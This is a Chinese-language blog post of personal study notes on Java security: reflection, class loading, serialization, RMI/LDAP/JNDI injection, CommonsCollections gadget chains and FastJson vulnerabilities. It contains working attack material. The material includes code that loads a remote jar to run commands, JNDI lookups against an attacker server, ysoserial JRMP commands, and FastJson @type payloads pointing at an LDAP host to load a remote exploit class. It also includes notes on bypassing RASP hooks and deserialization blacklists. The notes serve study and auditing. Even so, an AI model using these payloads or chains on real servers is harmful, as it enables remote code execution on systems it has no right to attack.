---
layout: post
title: Java Security
featured-img: java
summary: 系统学习，作个人备忘
---

+ [Java基础](#java基础)
  + [ClassLoader](#classloader)
  + [Java反射](#java反射)
  + [Unsafe包](#unsafe)
  + [命令执行](#命令执行)
  + [UrlConnectoin](#urlconnection)
  + [Java序列化](#java序列化)
+ [Java安全](#java安全)
  + [RMI](#rmi)
  + [LDAP](#ldap)
  + [JNDI](#jndi)
  + [安全限制](#安全限制)
  + [Gadgets](#gadgets)
  + [Vuln](#vuln)

大概两年前写过简单的Java，一年前做过几次Java代码审计，因为偏见（语法啰嗦冗杂）一直没有系统的学习，用到时去找现成EXP就完了。大概19年CTF中Java安全的题目突然多了起来（正常情况下本来就该这样，实战中国内站本来就Java和.net居多，PHP相对少点，Python/node就别提了），各大安全社区也冒出很多Java安全文章（实际上最近学习中看到不少文章都是15年甚至更早）

对有其它语言经验的人，学习过程中，重点放在Java特有的攻击方式即可。系统学习一遍，感觉Java也不是不可接受，只能说语言风格是沉稳工程型的

本文作个人备忘，只记录对自己有价值的知识点

# Java基础

语言基础过一遍learnXinY就行了。Java给我的感觉，虽然是个编译型语言，但因为有一层JVM，加上一些反射/动态类加载操作（正常编译型语言里频繁的反射带来的性能损失是不可忍受的），整体元编程能力和灵活性比一般编译型语言强太多了

## ClassLoader

个人理解就是JVM中runtime期动态加载类的字节码，跟反射差不多。实话实说，看了这一节，大概就清楚为什么Java反序列化里有那么多远程加载。`java.lang.ClassLoader`是个抽象类

Java程序运行前先编译为.class文件，Java类初始化时会调用`java.lang.ClassLoader`加载类字节码，`ClassLoader`调用JVM的native方法定义一个`java.lang.Class`实例，这里的`java.lang.Class`实际可理解为类对象的类，相当于元类

`ClassLoader`类的核心方法：

+ `loadClass`
+ `findClass`
+ `findLoadedClass`
+ `defineClass`
+ `resolveClass`

***

常见的类加载方式：

```java
// reflect
Class.forName("com.sec.classloader.HelloWorld");

// ClassLoader
this.getClass().getClassLoader().loadClass("com.sec.classloader.HelloWorld");
```

反射加载会默认初始化被加载类的静态属性和方法，而`ClassLoader`不会

***

`java.lang.ClassLoader`是所有类加载器的父类，其中一个子类`java.net.URLClassLoader`重载了`findClass`方法，实现了加载远程资源文件

#### URLClassLoader

该类继承了`ClassLoader`，并有加载远程资源的能力

```java
URL url = new URL("https://javaweb.org/tools/cmd.jar");
URLClassLoader ucl = new URLClassLoader(new URL[]{url});
String cmd = "id";

Class cmdClass = ucl.loadClass("CMD");
Process ps = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);
```

远程的cmd.jar：

```java
import java.io.IOException;

public class CMD {
    public static Process exec(String cmd) throws IOException {
    	return Runtime.getRuntime().exec(cmd);
    }
}
```

## Java反射

反射的概念就不赘述了，反射在Java里太常见了，甚至可以说是Java的一个标签

Java反射操作的是`java.lang.Class`对象，通常由以下几种方式获取一个类：

+ `类名.class`
+ `Class.forName("xxx")`
+ `classLoader.loadClass("xxx")`

获取数组类型的Class对象需要使用Java类型的描述符方式：

```java
Class<?> doubleArray = Class.forName("[D"); // 相当于double[].class
Class<?> cStringArray = Class.forName("[[Ljava.lang.String;"); // 相当于String[][].class
```

**获取Runtime类Class：**

```java
String name = "java.lang.Runtime";
Class cls1 = Class.forName(name);
Class cls2 = java.lang.Runtime.class;
Class cls3 = ClassLoader.getSystemClassLoader().loadClass(name);
```

反射调用内部类的时候需要同`$`来代替`.`，如`com.sec.Test`类有一个叫`Hello`的内部类，那么调用时要写`com.sec.Test$Hello`

### 反射java.lang.Runtime

不使用反射执行命令：

```java
System.out.println(IOUtils.toString(Runtime.getRuntime().exec("id").getInputStream(), "UTF-8"));
```

这里的IOUtils在`org.apache.commons.io.IOUtils`

反射Runtime执行命令，Java里的InputStream/OutputStream是针对当前程序说的，Input有Read方法，Output有Write方法

```java
Class runtimeCls = Class.forName("java.lang.Runtime");
Constructor constructor = runtimeCls.getDeclaredConstructor();

constructor.setAccessible(true);

Object runtimeInst = constructor.newInstance();
Method exec = runtimeCls.getMethod("exec", String.class);

Process process = (Process) exec.invoke(runtimeInst, "id");
InputStream inputStream = process.getInputStream();

byte[] buf = new byte[1024];
inputStream.read(buf);
System.out.println(new String(buf));
```

### 反射创建类实例

Runtime的构造函数是private的，所以只能通过`Runtime.getRuntime()`去获取实例，或通过反射

`runtimeCls.getDeclaredConstructor`和`runtimeCls.getConstructor`都可以获取到构造函数，区别是后者无法获取到私有方法。如果构造函数有参数的情况下需要传入对应参数类型的数组：`clazz.getDeclaredConstructor(String.class, String.class)`，通过`clazz.getDeclaredConstructors`可以获取到所有构造函数的数组

之后可以通过`constructor.newInstance()`来创建实例，如果有参数需要传入`newInstance("a")`

### 反射调用类方法

`clazz.getDeclaredMethod("exec")`或`clazz.getDeclaredMethods()[0]`，方法参数：`clazz.getDeclaredMethod("exec", String.class)`

`getMethod`可以获取到**当前类**和**父类**的所有public方法，`getDeclaredMethod`可以获取当前类所有方法（不包括父类）

`method.invoke(inst, Object... args)`调用，调用static方法（也就是类方法）第一个参数可为null

### 反射访问成员变量

```java
Field f = clazz.getDeclaredField("foo");
Object obj = f.get(inst);
f.set(inst, 0);
```

同样可以通过`f.setAccessible(true)`修改访问权限

如果需要修改`final`修改的常量，需要先修改方法

```java
// 反射获取field类的modifiers
Field modifier = field.getClass().getDeclaredField("modifiers");

modifiers.setAccessible(true);

modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
field.set(inst, "val");
```

不过反射修改完后还是得通过反射才能获取到修改的值`field.get(inst)`，而直接获取`inst.foo`则还是原值

## Unsafe

很多编译型语言都会提供的Unsafe模块，比如Go，Rust等，供开发者做一些底层的Hack

`sun.misc.Unsafe`是Java底层API提供的一个Java类，仅限Java内部调用，它提供了非常底层的内存、CAS、线程调度、类、对象等操作。外部只能通过反射调用

```java
Field f = Unsafe.getDeclaredField("theUnsafe");
f.setAccessible(true);
Unsafe unsafe = (Unsafe) f.get(null);
```

通过反射创建Unsafe类实例

```java
Constructor constructor = Unsafe.class.getDeclaredConstructor();
constructor.setAccessible(true);
Unsafe unsafe = (Unsafe) constructor.newInstance();
```

### allocateInstance不经过构造函数创建实例

假设RASP hook了构造函数，我们可以利用Unsafe类来创建实例

```
HookedCls cls = (HookedCls) unsafe.allocateInstance(HookedCls.class);
```

### defineClass直接调用JVM创建类对象

在`ClassLoader`被限制的情况下可以通过`Unsafe`的`defineClass`来注册类

```java
Class cls = unsafe.defineClass(
    TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length
);
```

调用需要传入类加载器和保护域的方法

```java
ClassLoader loader = ClassLoader.getSystemClassLoader();

ProtectionDomain domain = new ProtectionDomain(
	new CodeSource(null, (Certificate[]) null), null, loader, null
);

Class cls = unsafe.defineClass(
	TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length, loader, domain
);
```

`Unsafe`还可通过`defineAnonymousClass`创建内部类

`Java8`中需要调用传加载器和保护域的方法。`Java11`开始`Unsafe`类把`defineClass`移除了（`defineAnonymousClass`方法还在），虽然可以通过`java.lang.invoke.MethodHandlers.Lookup.defineClass`代替，但实际`MethodHandlers`间接调用了`ClassLoader`的`defineClass`

## 命令执行

使用`java.lang.Runtime`类的`exec`方法，该方法直接传递命令到`execve syscall`，无bash命令扩展，同Go的`exec.Command()`

### 反射Runtime命令执行

```java
Class<?> cls = Class.forName("java.lang.Runtime");
Method getRuntime = cls.getDeclaredMethod("getRuntime");
Method exec = cls.getDeclaredMethod("exec", String.class);
Object rtm = getRuntime.invoke(null);
Process pcs = (Process) exec.invoke(rtm, "id");

byte[] buf = new byte[1024];
pcs.getInputStream().read(buf);
System.out.println(new String(buf));
```

### ProcessBuilder命令执行

`Runtime.exec`最终是调用`ProcessBuilder`

```java
ProcessBuilder pb = new ProcessBuilder("id");
byte[] buf = new byte[1024];
pb.start().getInputStream().read(buf);
System.out.println(new String(buf));
```

### UNIXProcess/ProcessImpl

JDK9时把`UNIXProcess`合并到`ProcessImpl`中。该类提供了`forkAndExec`的native方法

javasec.org的作者说去年（应该是2018年）RASP只防御到`ProcessBuilder.start()`方法，所以只需直接反射调用上述俩方法就可绕过

native调用有点麻烦：

https://javasec.org/javase/CommandExecution/#%E5%8F%8D%E5%B0%84unixprocessprocessimpl%E6%89%A7%E8%A1%8C%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4

### JNI命令执行

通过JNI调用动态链接库，见https://javasec.org/javase/CommandExecution/#jni%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C

## URLConnection

Java抽象出一个URLConnection类，通过URL类中的`openConnection`获取。支持的协议在`sun.net.www.protocol`，常见的有：

+ file/netdoc
+ ftp
+ gopher（jdk8后没了，jdk7高版本虽存在，但需额外设置）
+ http(s)
+ jar
+ mailto

```java
URL url = new URL("file:///C:/windows/win.ini");
URLConnection connection = url.openConnection();
connection.connect();
InputStream stream =  connection.getInputStream();
byte[] buf = new byte[1024];
stream.read(buf);
System.out.println(new String(buf));
```

Java中对http(s)：

+ 默认启用NTLM认证（`tryTransparentNTLMServer` is always true，2011.1.10的JDK7中引入，2018.10.8修复）

+ 默认跟随跳转
  + 但Location头的protocol和原始请求protocol得相同

## Java序列化

反序列化不会调用类构造方法，创建类实例时使用了`sun.reflect.ReflectionFactory.newConstructorForSerialization`创建了一个反序列化专用的构造函数，可以绕过构造函数创建类实例

### ObjectInputStream/ObjectOutputStream

`java.io.ObjectOutputStream`的`writeObject`方法序列化对象，`java.io.ObjectInputStream`的`readObject`方法反序列化对象

### java.io.Serializable接口

该接口是一个空接口，用于标识实现它的类可序列化

实现`Serializable`接口的类需要一个`serialVersionUID`常量，如果类未显式声明，则序列化时将基于该类各个方面计算该类默认的`serialVersionUID`

```java
public class Test implements Serializable {
    private String x;

    public static void main(String[] args) {
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            try {
                Test test = new Test();
                test.x = "TESTING";

                ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);
                outputStream.writeObject(test);
                outputStream.close();

                System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray()));

                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
                ObjectInputStream inputStream = new ObjectInputStream(byteArrayInputStream);
                Test test1 = (Test) inputStream.readObject();
                System.out.println(test1.x);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

如果序列化的类重写了`writeObject`方法，则用重写的方法。序列化会写入所有不包含被`transient`修饰的变量

### 自定义序列化

反序列化魔术方法：

+ `private void writeObject(ObjectOutputStream oos)`
+ `private void readObject(ObjectInputStream ois)`
+ `private void readObjectNoData()`
+ `protected Object writeReplace()`，写入时替换对象
+ `protected Object readResolve()`

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    System.out.println("readObject...");
    ois.defaultReadObject();
}

private void writeObject(ObjectOutputStream oos) throws IOException {
    oos.defaultWriteObject();
    System.out.println("writeObject...");
}

private void readObjectNoData() {
    System.out.println("readObjectNoData...");
}

protected Object writeReplace() {
    System.out.println("writeReplace....");
    return null;
}

protected Object readResolve() {
    System.out.println("readResolve....");
    return null;
}
```



# Java安全

## RMI

RMI的架构是这样的：

+ RMI Registry：存储注册对象的stub。仅可对同一主机上运行的registry调用bind/rebind/unbind，而lookup/list可远程调用。虽然不能对远程registry调用bind，但远程registry实际会对任意输入反序列化，故存在被反序列化RCE的风险

+ RMI Client：从registry获取stub，从stub中获取JNDI server addr，再请求server

+ RMI Server：存储对象数据。不一定和Registry在同一个JVM。方法执行的地方，仅把方法返回值返回给Client

RMI存在动态类加载行为，即会先从本地CLASSPATH加载，如无则请求codebase加载。JDK 6u132、JDK 7u122、JDK 8u113  之后，系统属性 `com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为false，无法再通过直接的JNDI Reference + RMI达成攻击

需`System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");`

## LDAP

JNDI与LDAP交互需要几个特殊属性：`javaCodeBase、objectClass、javaFactory、javaSerializedData、javaRemoteLocation`，后文结合JNDI细说

```
objectClass = 'javaNamingReference'
javaCodebase = 'http://1.1.1.1:9999'
javaFactory = 'EvilClass'
javaClassName = 'EvilClass'
javaSerializedData
```

## JNDI

JNDI是Java的API，是一个上层封装。下层是RMI（JRMP协议传输）和LDAP等的具体实现（还有DNS，COBRA，IIOP等等）。本质就是在实现RPC（cross JVM）

```java
// RMI
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
        "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL,
        "rmi://localhost:9999");
Context ctx = new InitialContext(env);

ctx.bind("refObj", new RefObject());
ctx.lookup("refObj");


// LDAP
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
    "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://localhost:1389");

DirContext ctx = new InitialDirContext(env);
Object local_obj = ctx.lookup("cn=foo,dc=test,dc=org");
```

### JNDI动态协议转换

JDNI支持动态协议转换，即自动识别URL协议并使用对应的factory类，provider通过URL传递

```java
Context ctx = new InitialContext();
ctx.lookup("rmi://attacker-server/refObj");
// ctx.lookup("ldap://attacker-server/cn=bar,dc=test,dc=org");
// ctx.lookup("iiop://attacker-server/bar");
```

### javax.naming.Reference

构造函数需要三个参数：

+ className，如果本地找不到这个类，则去远程加载
+ classFactory，远程加载时的factory类
+ classFactoryLocation，远程factory类的加载地址，可以是file、ftp、http协议

```java
Reference refObj = new Reference("refClassName", "FactoryClassName", "http://1.1.1.1:9999/");

ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
registry.bind("refObj", refObjWrapper);
```

当client lookup时，会获取到一个reference类的stub，接着client会先去本地CLASSPATH找refClassName类，找不到的话会去http://1.1.1.1:9999加载FactoryClassName类，e.g. request to http://1.1.1.1/FactoryClassName.class

因为会加载class字节码，所以可以直接将EXP写入static块，它不受`java.rmi.server.useCodebaseOnly`限制。naming reference利用一般选择marshalsec

安全限制：

![](https://eddieivan01.github.io/assets/img/jndi.jpg)

RMI：

+ `JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121`开始`java.rmi.server.useCodebaseOnly`默认配置已经改为了`true`。

+ `JDK 6u132, JDK 7u122, JDK 8u113`开始`com.sun.jndi.rmi.object.trustURLCodebase`默认值已改为了`false`。

LDAP：

+ `LDAP`在`JDK 11.0.1、8u191、7u201、6u211`后也将默认的`com.sun.jndi.ldap.object.trustURLCodebase`设置为了`false`。

### 高于JDK8u191版本的JDNI注入

需要结合受害者本地CLASSPATH中的gadgets

1. 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。
2. 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。LDAP除了可通过Reference指定CodeBase外，还可返回javaSerializedData

### 总结一下JNDI的几种攻击方式

+ RMI + JRMP serialized data
+ RMI + JNDI naming reference
+ LDAP + JNDI naming reference
+ 高于JDK8u191的两种利用方式

## 安全限制

+ RMI codebase：`5u45、6u45、7u21、8u121`

+ LDAP codebase：`JDK11.0.1、8u191、7u201、6u211`

+ JEP290：反序列化过程中增加`filterCheck`

  ```java
  if (String.class == clazz
      || java.lang.Number.class.isAssignableFrom(clazz)
      || Remote.class.isAssignableFrom(clazz)
      || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
      || UnicastRef.class.isAssignableFrom(clazz)
      || RMIClientSocketFactory.class.isAssignableFrom(clazz)
      || RMIServerSocketFactory.class.isAssignableFrom(clazz)
      || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)
      || java.rmi.server.UID.class.isAssignableFrom(clazz)) {
      return ObjectInputFilter.Status.ALLOWED;
  } else {
      return ObjectInputFilter.Status.REJECTED;
  }
  ```

  `ysoserial.payload.JRMPClient`中使用UnicastRef绕过

  ```
  java -cp ysoserial.jar ysoserial.exploit.JRMPListener 23333 CommonsCollections5 calc
  
  // RMINop是我自己改了RMIRegistryExploit，直接bind，不要封装Proxy
  java -cp ysoserial.jar ysoserial.exploit.RMINop 127.0.0.1 9999 JRMPClient 127.0.0.1:23333
```
  
  PowerShell直接重定向的话，由于默认UTF16编码，序列化数据魔数会出错，Windows10 1903上使用cmd没问题

## Gadgets

### CommonCollections

#### InvokerTransformer

下文以CC代称

CC中有一个`cc.functors.InvokerTransformer`实现了`cc.Transformer`接口，`InvokerTransformer`的`transform`利用反射创建类实例

```java
// InvokerTransformer.transform
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
        return method.invoke(input, iArgs);
    } catch (Exception ex) {
        ;
    }
}

// EXP
public static void main(String[] args) {
    String cmd = "calc";
    InvokerTransformer transformer = new InvokerTransformer(
          "exec", new Class[]{String.class}, new Object[]{cmd}
    );

    transformer.transform(Runtime.getRuntime());
}
```

#### ChainedTransformer

`cc.functors.ChainedTransformer`可以实现对一个Transformer数组里的Transformer的链式调用，`output | input`

```java
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

调用链很好理解：

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
};

Transformer transformerChain = new ChainedTransformer(transformers);
```

还需最后一步触发`ChainedTransformer`的transform方法，利用`cc.TransformedMap`和`sun.reflect.annotation.AnnotationInvocationHandler`：

```java
Map innerMap = new HashMap();
innerMap.put("value", "value");
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
onlyElement.setValue("exp");
```

`AnnotationInvocationHandler`的`readObject`间接的调用了`MapEntry`的`setValue`方法，外部需要反射创建实例

map的key名称需要对应于传入的注解`java.lang.annotation.Target`的方法名

```java
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);

// Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);
Object instance = constructor.newInstance(Target.class, transformedMap);
```

其他的就不一一复现了，直接用ysoserial即可

## Vuln

### FastJson

这个太有名了，没系统学习前我就熟知漏洞版本

JSON库支持转换到类在很多语言里都是很常见的，用来映射JSON到类的成员变量，所以FastJson里有`@type`

FastJson在解析时会提取类中的setter和getter方法，如果JSON的键中存在这个值，就会去调用对应的getter/setter

#### 1.2.24

这个版本没有任何防范，通过`com.sun.rowset.JdbcRowSetImpl`进行JNDI注入，Jdbc的source允许指定JNDI URL

```java
exp = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://1.1.1.1:9999/Exploit\", \"autoCommit\":true}";
```

修补后1.2.25添加了`AutoTypeSupport`，增加了`checkAutoType`函数，函数中是白名单 + 黑名单机制

```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
    if (typeName == null) {
        return null;
    }

    final String className = typeName.replace('$', '.');

    // whitelist
    if (autoTypeSupport || expectClass != null) {
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];
            if (className.startsWith(accept)) {
                return TypeUtils.loadClass(typeName, defaultClassLoader);
            }
        }

        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
    }

    // load cache
    Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
    if (clazz == null) {
        clazz = deserializers.findClass(typeName);
    }

    if (clazz != null) {
        if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {
            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
        }

        return clazz;
    }

    if (!autoTypeSupport) {
        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];
            if (className.startsWith(accept)) {
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);

                if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }
                return clazz;
            }
        }
    }

    if (autoTypeSupport || expectClass != null) {
        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
    }

    if (clazz != null) {
        if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
            || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
           ) {
            throw new JSONException("autoType is not support. " + typeName);
        }

        if (expectClass != null) {
            if (expectClass.isAssignableFrom(clazz)) {
                return clazz;
            } else {
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
            }
        }
    }

    if (!autoTypeSupport) {
        throw new JSONException("autoType is not support. " + typeName);
    }

    return clazz;
}
```

#### 1.2.42

一个逻辑漏洞，在`AutoTypeSupport`开启时，白名单黑名单都没有命中的情况下，调用`TypeUtil.loadClass`：

```java
if (className.charAt(0) == '[') {
    Class<?> componentType = loadClass(className.substring(1), classLoader);
    return Array.newInstance(componentType, 0).getClass();
}

if (className.startsWith("L") && className.endsWith(";")) {
    String newClassName = className.substring(1, className.length() - 1);
    return loadClass(newClassName, classLoader);
}
```

没什么好说的了

修复后，会先去掉首尾的`[`和`;`，但再加一层就可以了；并且将黑名单转换成了类名hash：https://github.com/LeadroyaL/fastjson-blacklist

#### 1.2.43

修补办法：

```java
if (clsName.startswith('LL')) throw new Exception();
```

#### 1.2.45

黑名单被绕过，`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`

```java
exp = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://1.1.1.1:9999/Exploit\"}}"
```

#### 1.2.47

通过缓存，无需开启`autotype`

```java
exp = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://1.1.1.1:9999/Exploit\",\"autoCommit\":true}}}";
```

`checkAutoType`中的流程：

```java
if (Arrays.binarySearch(denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
    throw new JSONException("autoType is not support. " + typeName);
}
```

而`TypeUtils.loadClass`中：

```java
if(classLoader != null){
    clazz = classLoader.loadClass(className);
    
    if (cache) {
        mappings.put(className, clazz);
    }
    return clazz;
}
```

`MiscCodec.deserialize`中有这样的逻辑，跟踪`strVal`是由`{"@type": "java.lang.Class", "val": "class"}`传入的

```java
if (clazz == Class.class) {
    return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
}
```

由于`TypeUtils.loadClass`会进行缓存，再次执行到第二段payload时，在`checkAutoType`中，直接`TypeUtils.getClassFromMapping`从缓存中获取到了`JdbcRowSetImpl`

同时，由于FJ的字符解析规则，`@type`可这样写`@\u0074ype`/`@\x74ype`

# References

+ https://javasec.org
+ https://www.anquanke.com/post/id/194384
+ https://xz.aliyun.com/t/6660
+ https://xz.aliyun.com/t/6633